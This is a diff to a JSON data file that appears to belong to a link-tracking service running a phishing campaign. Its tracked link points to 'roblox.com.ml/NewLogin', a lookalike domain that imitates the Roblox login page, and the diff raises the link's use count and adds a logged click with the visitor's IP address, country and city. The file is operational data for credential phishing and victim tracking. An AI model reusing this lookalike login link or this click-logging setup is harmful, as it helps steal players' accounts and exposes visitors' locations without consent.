@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 190,
+    "useCount": 191,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1632,6 +1632,14 @@
         "city": "Santo André",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1776967756357,
+        "ip": "5.181.57.10",
+        "country": "United Kingdom",
+        "city": "Galashiels",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
